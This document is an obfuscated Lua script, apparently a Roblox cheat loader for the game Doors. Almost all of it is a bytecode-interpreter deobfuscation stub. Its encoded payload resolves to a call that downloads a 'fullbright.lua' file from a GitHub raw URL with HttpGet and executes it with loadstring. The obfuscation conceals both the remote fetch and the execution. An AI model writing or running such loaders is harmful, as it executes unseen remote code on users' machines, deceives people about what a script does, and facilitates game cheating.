local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			local v87 = 0;
			while true do
				if (v87 ~= 0) then
				else
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v88 = 0;
			local v89;
			while true do
				if (v88 ~= 0) then
				else
					v89 = v2(v0(v30, 16));
					if v19 then
						local v124 = 0;
						local v125;
						while true do
							if (v124 ~= 1) then
							else
								return v125;
							end
							if (v124 ~= 0) then
							else
								v125 = v5(v89, v19);
								v19 = nil;
								v124 = 1;
							end
						end
					else
						return v89;
					end
					break;
				end
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v90 = (v31 / ((5 - 3) ^ (v32 - (2 - 1)))) % ((3 - 1) ^ (((v33 - (2 - 1)) - (v32 - (620 - (555 + 64)))) + (932 - (857 + 74))));
			return v90 - (v90 % (569 - (367 + (1838 - (1523 + 114)))));
		else
			local v91 = 0;
			local v92;
			while true do
				if (v91 ~= ((834 + 93) - (214 + 713))) then
				else
					v92 = 2 ^ (v32 - ((1 - 0) + 0));
					return (((v31 % (v92 + v92)) >= v92) and (1 + 0)) or (877 - (282 + 595));
				end
			end
		end
	end
	local function v21()
		local v34 = 0;
		local v35;
		while true do
			if (v34 == (1066 - (68 + 997))) then
				return v35;
			end
			if (v34 ~= (1270 - (226 + 1044))) then
			else
				v35 = v1(v16, v18, v18);
				v18 = v18 + (4 - 3);
				v34 = 118 - (32 + 85);
			end
		end
	end
	local function v22()
		local v36, v37 = v1(v16, v18, v18 + 2 + 0);
		v18 = v18 + 1 + 1;
		return (v37 * (1213 - (892 + 65))) + v36;
	end
	local function v23()
		local v38 = 0 - 0;
		local v39;
		local v40;
		local v41;
		local v42;
		while true do
			if (v38 ~= ((0 - 0) - 0)) then
			else
				v39, v40, v41, v42 = v1(v16, v18, v18 + 3);
				v18 = v18 + 4;
				v38 = (1 + 0) - 0;
			end
			if (v38 ~= (351 - (87 + 263))) then
			else
				return (v42 * (16777396 - (67 + 113))) + (v41 * 65536) + (v40 * ((747 - 559) + 68)) + v39;
			end
		end
	end
	local function v24()
		local v43 = v23();
		local v44 = v23();
		local v45 = 953 - (802 + 150);
		local v46 = (v20(v44, 2 - 1, 36 - 16) * (2 ^ ((454 - (44 + 386)) + 8))) + v43;
		local v47 = v20(v44, 1018 - (915 + 82), 31);
		local v48 = ((v20(v44, 90 - 58) == (1 + 0)) and -(1 - 0)) or (1188 - ((2555 - (998 + 488)) + 118));
		if (v47 == (0 - 0)) then
			if (v46 == (0 - (0 + 0))) then
				return v48 * (0 + 0);
			else
				local v114 = 0 - 0;
				while true do
					if (v114 ~= (0 + 0 + 0)) then
					else
						v47 = 792 - ((1140 - (201 + 571)) + 423);
						v45 = 0 - 0;
						break;
					end
				end
			end
		elseif (v47 ~= (2065 - (10 + (1146 - (116 + 1022))))) then
		else
			return ((v46 == 0) and (v48 * ((3 - (8 - 6)) / ((260 + 182) - (416 + 26))))) or (v48 * NaN);
		end
		return v8(v48, v47 - (3266 - 2243)) * (v45 + (v46 / ((3 - 1) ^ ((461 - (145 + 293)) + 29))));
	end
	local function v25(v49)
		local v50;
		if not v49 then
			v49 = v23();
			if (v49 ~= 0) then
			else
				return "";
			end
		end
		v50 = v3(v16, v18, (v18 + v49) - (3 - 2));
		v18 = v18 + v49;
		local v51 = {};
		for v67 = 3 - 2, #v50 do
			v51[v67] = v2(v1(v3(v50, v67, v67)));
		end
		return v6(v51);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v52 = (function()
			return function(v93, v94, v95, v96, v97, v98, v99, v100)
				local v93 = (function()
					return 0 + 0;
				end)();
				local v94 = (function()
					return;
				end)();
				local v95 = (function()
					return;
				end)();
				while true do
					if (v93 ~= #"~") then
					else
						if (v94 == #",") then
							v95 = (function()
								return v96() ~= 0;
							end)();
						elseif (v94 == (6 - 4)) then
							v95 = (function()
								return v97();
							end)();
						elseif (v94 ~= #"-19") then
						else
							v95 = (function()
								return v98();
							end)();
						end
						v99[v100] = (function()
							return v95;
						end)();
						break;
					end
					if (v93 ~= (0 - 0)) then
					else
						local v120 = (function()
							return 374 - (123 + 251);
						end)();
						local v121 = (function()
							return;
						end)();
						while true do
							if (0 ~= v120) then
							else
								v121 = (function()
									return 0 - 0;
								end)();
								while true do
									if (v121 ~= (699 - (208 + 490))) then
									else
										v93 = (function()
											return #"[";
										end)();
										break;
									end
									if (v121 ~= (0 + 0)) then
									else
										v94 = (function()
											return v96();
										end)();
										v95 = (function()
											return nil;
										end)();
										v121 = (function()
											return 1;
										end)();
									end
								end
								break;
							end
						end
					end
				end
				return v93, v94, v95, v96, v97, v98, v99, v100;
			end;
		end)();
		local v53 = (function()
			return function(v101, v102, v103)
				local v104 = (function()
					return 0;
				end)();
				local v105 = (function()
					return;
				end)();
				while true do
					if (v104 ~= (0 + 0)) then
					else
						v105 = (function()
							return 0;
						end)();
						while true do
							if (v105 ~= (836 - (660 + 176))) then
							else
								local v126 = (function()
									return 0;
								end)();
								while true do
									if (v126 ~= 0) then
									else
										v101[v102 - #"!"] = (function()
											return v103();
										end)();
										return v101, v102, v103;
									end
								end
							end
						end
						break;
					end
				end
			end;
		end)();
		local v54 = (function()
			return {};
		end)();
		local v55 = (function()
			return {};
		end)();
		local v56 = (function()
			return {};
		end)();
		local v57 = (function()
			return {v54,v55,nil,v56};
		end)();
		local v58 = (function()
			return v23();
		end)();
		local v59 = (function()
			return {};
		end)();
		for v69 = #"|", v58 do
			FlatIdent_60EA1, Type, Cons, v21, v24, v25, v59, v69 = (function()
				return v52(FlatIdent_60EA1, Type, Cons, v21, v24, v25, v59, v69);
			end)();
		end
		v57[#"xnx"] = (function()
			return v21();
		end)();
		for v70 = #"\\", v23() do
			local v71 = (function()
				return v21();
			end)();
			if (v20(v71, #"!", #",") ~= (0 + 0)) then
			else
				local v109 = (function()
					return 202 - (14 + 188);
				end)();
				local v110 = (function()
					return;
				end)();
				local v111 = (function()
					return;
				end)();
				local v112 = (function()
					return;
				end)();
				local v113 = (function()
					return;
				end)();
				while true do
					if (v109 ~= (676 - (534 + 141))) then
					else
						v112 = (function()
							return nil;
						end)();
						v113 = (function()
							return nil;
						end)();
						v109 = (function()
							return 2;
						end)();
					end
					if ((0 + 0) ~= v109) then
					else
						local v122 = (function()
							return 0;
						end)();
						local v123 = (function()
							return;
						end)();
						while true do
							if (v122 ~= (0 + 0)) then
							else
								v123 = (function()
									return 0 + 0;
								end)();
								while true do
									if (v123 ~= 1) then
									else
										v109 = (function()
											return 1;
										end)();
										break;
									end
									if (v123 ~= (0 - 0)) then
									else
										local v177 = (function()
											return 0 - 0;
										end)();
										while true do
											if (v177 ~= 0) then
											else
												v110 = (function()
													return 0 - 0;
												end)();
												v111 = (function()
													return nil;
												end)();
												v177 = (function()
													return 1 + 0;
												end)();
											end
											if (v177 ~= 1) then
											else
												v123 = (function()
													return 1 + 0;
												end)();
												break;
											end
										end
									end
								end
								break;
							end
						end
					end
					if (v109 ~= (398 - (115 + 281))) then
					else
						while true do
							if (2 ~= v110) then
							else
								local v157 = (function()
									return 0;
								end)();
								local v158 = (function()
									return;
								end)();
								while true do
									if (v157 ~= 0) then
									else
										v158 = (function()
											return 0 - 0;
										end)();
										while true do
											if (v158 == (1 + 0)) then
												v110 = (function()
													return #"xnx";
												end)();
												break;
											end
											if (0 ~= v158) then
											else
												if (v20(v112, #"~", #"}") ~= #"~") then
												else
													v113[4 - 2] = (function()
														return v59[v113[2]];
													end)();
												end
												if (v20(v112, 7 - 5, 869 - (550 + 317)) ~= #".") then
												else
													v113[#"asd"] = (function()
														return v59[v113[#"asd"]];
													end)();
												end
												v158 = (function()
													return 1 - 0;
												end)();
											end
										end
										break;
									end
								end
							end
							if (v110 ~= #"|") then
							else
								local v159 = (function()
									return 0;
								end)();
								while true do
									if (v159 == 0) then
										v113 = (function()
											return {v22(),v22(),nil,nil};
										end)();
										if (v111 == 0) then
											local v180 = (function()
												return 0 - 0;
											end)();
											local v181 = (function()
												return;
											end)();
											while true do
												if (v180 ~= (285 - (134 + 151))) then
												else
													v181 = (function()
														return 1665 - (970 + 695);
													end)();
													while true do
														if (v181 == (0 - 0)) then
															v113[#"91("] = (function()
																return v22();
															end)();
															v113[#"0836"] = (function()
																return v22();
															end)();
															break;
														end
													end
													break;
												end
											end
										elseif (v111 == #"<") then
											v113[#"xnx"] = (function()
												return v23();
											end)();
										elseif (v111 == (1992 - (582 + 1408))) then
											v113[#"-19"] = (function()
												return v23() - ((6 - 4) ^ (19 - 3));
											end)();
										elseif (v111 ~= #"19(") then
										else
											local v190 = (function()
												return 0;
											end)();
											local v191 = (function()
												return;
											end)();
											while true do
												if (v190 ~= (0 - 0)) then
												else
													v191 = (function()
														return 0;
													end)();
													while true do
														if (v191 ~= 0) then
														else
															v113[#"19("] = (function()
																return v23() - ((1826 - (1195 + 629)) ^ (20 - 4));
															end)();
															v113[#"0313"] = (function()
																return v22();
															end)();
															break;
														end
													end
													break;
												end
											end
										end
										v159 = (function()
											return 242 - (187 + 54);
										end)();
									end
									if ((781 - (162 + 618)) ~= v159) then
									else
										v110 = (function()
											return 2 + 0;
										end)();
										break;
									end
								end
							end
							if (v110 ~= #"xxx") then
							else
								if (v20(v112, #"xnx", #"19(") ~= #"]") then
								else
									v113[#"?id="] = (function()
										return v59[v113[#"xnxx"]];
									end)();
								end
								v54[v70] = (function()
									return v113;
								end)();
								break;
							end
							if (v110 ~= 0) then
							else
								local v161 = (function()
									return 0 + 0;
								end)();
								while true do
									if (v161 ~= 1) then
									else
										v110 = (function()
											return #",";
										end)();
										break;
									end
									if (v161 ~= 0) then
									else
										v111 = (function()
											return v20(v71, 2, #"nil");
										end)();
										v112 = (function()
											return v20(v71, #"0836", 6);
										end)();
										v161 = (function()
											return 1;
										end)();
									end
								end
							end
						end
						break;
					end
				end
			end
		end
		for v72 = #"!", v23() do
			v55, v72, v28 = (function()
				return v53(v55, v72, v28);
			end)();
		end
		return v57;
	end
	local function v29(v61, v62, v63)
		local v64 = v61[1 - 0];
		local v65 = v61[2 - 0];
		local v66 = v61[1 + 2];
		return function(...)
			local v73 = v64;
			local v74 = v65;
			local v75 = v66;
			local v76 = v27;
			local v77 = 1637 - (1373 + (732 - 469));
			local v78 = -(1001 - (451 + 549));
			local v79 = {};
			local v80 = {...};
			local v81 = v12("#", ...) - (585 - ((127 - 70) + 527));
			local v82 = {};
			local v83 = {};
			for v106 = 1427 - (41 + 1386), v81 do
				if (v106 >= v75) then
					v79[v106 - v75] = v80[v106 + (104 - (17 + 86))];
				else
					v83[v106] = v80[v106 + (1 - 0)];
				end
			end
			local v84 = (v81 - v75) + 1;
			local v85;
			local v86;
			while true do
				v85 = v73[v77];
				v86 = v85[1 - 0];
				if (v86 <= 3) then
					if (v86 <= ((2515 - (369 + 761)) - (746 + 638))) then
						if (v86 == (0 + 0 + 0)) then
							local v127;
							local v128, v129;
							local v130;
							local v131;
							v83[v85[2]] = {};
							v77 = v77 + (1 - 0);
							v85 = v73[v77];
							v83[v85[2 - 0]] = v63[v85[344 - (218 + 123)]];
							v77 = v77 + (1582 - (1535 + 46));
							v85 = v73[v77];
							v83[v85[2 + 0]] = v63[v85[1 + 2]];
							v77 = v77 + (561 - (306 + (460 - 206)));
							v85 = v73[v77];
							v131 = v85[2];
							v130 = v83[v85[1 + 2]];
							v83[v131 + ((1 - 0) - 0)] = v130;
							v83[v131] = v130[v85[1471 - (899 + 568)]];
							v77 = v77 + 1 + 0;
							v85 = v73[v77];
							v83[v85[4 - 2]] = v85[11 - 8];
							v77 = v77 + ((176 + 428) - (268 + 335));
							v85 = v73[v77];
							v131 = v85[(1411 - 1119) - (60 + 230)];
							v128, v129 = v76(v83[v131](v13(v83, v131 + ((1326 - (239 + 514)) - (426 + 52 + 94)), v85[1 + 2])));
							v78 = (v129 + v131) - (1 + 0);
							v127 = (2785 - (797 + 532)) - (282 + 1174);
							for v162 = v131, v78 do
								local v163 = 811 - (82 + 487 + 242);
								while true do
									if (v163 ~= (982 - (14 + 4 + 964))) then
									else
										v127 = v127 + ((338 - (144 + 192)) - 1);
										v83[v162] = v128[v127];
										break;
									end
								end
							end
							v77 = v77 + (3 - 2);
							v85 = v73[v77];
							v131 = v85[1 + 1];
							v83[v131] = v83[v131](v13(v83, v131 + (1025 - (706 + 318)), v78));
							v77 = v77 + (1252 - (721 + (746 - (42 + 174))));
							v85 = v73[v77];
							v83[v85[1273 - (945 + 326)]]();
							v77 = v77 + ((2 + 0) - (1 + 0));
							v85 = v73[v77];
							do
								return;
							end
						else
							v83[v85[1 + 1]] = {};
						end
					elseif ((v86 > (2 + 0 + 0)) or (4557 <= 2087)) then
						local v148 = (237 + 463) - (271 + 429);
						local v149;
						local v150;
						while true do
							if ((3874 == 3874) and (v148 == (1 + (1504 - (363 + 1141))))) then
								v83[v149 + 1 + 0] = v150;
								v83[v149] = v150[v85[1504 - (1408 + 92)]];
								break;
							end
							if (v148 ~= (1086 - ((2041 - (1183 + 397)) + 625))) then
							else
								v149 = v85[1290 - (993 + 295)];
								v150 = v83[v85[(2 - 1) + 2]];
								v148 = 2 - 1;
							end
						end
					else
						local v151 = v85[1173 - (418 + 753)];
						v83[v151] = v83[v151](v13(v83, v151 + 1 + 0, v78));
					end
				elseif ((v86 <= (19 - 14)) or (1938 > 4935)) then
					if ((v86 == (1125 - (118 + 736 + 267))) or (4255 < 3423)) then
						do
							return;
						end
					else
						v83[v85[1 + 1]] = v85[1 + 2];
					end
				elseif (v86 <= (2 + 0 + 4)) then
					v83[v85[531 - (406 + 123)]] = v63[v85[1 + 2]];
				elseif (v86 == ((3751 - (1913 + 62)) - (1749 + 20))) then
					local v164 = v85[1 + 1 + 0];
					local v165, v166 = v76(v83[v164](v13(v83, v164 + ((1203 - (373 + 829)) - 0), v85[3 + 0])));
					v78 = (v166 + v164) - (1323 - (1249 + 73));
					local v167 = (0 - 0) + 0;
					for v175 = v164, v78 do
						local v176 = 1145 - (466 + 679);
						while true do
							if ((1454 <= 2491) and ((0 - 0) == v176)) then
								v167 = v167 + (2 - (732 - (476 + 255)));
								v83[v175] = v165[v167];
								break;
							end
						end
					end
				else
					v83[v85[1902 - (106 + (3727 - (565 + 1368)))]]();
				end
				v77 = v77 + 1 + 0;
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574035B3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4E612Q786F5265616C2F442Q6F72732D46752Q6C4272696768742F726566732F68656164732F6D61696E2F66752Q6C6272696768742E6C756100099Q003Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00", v9(), ...);
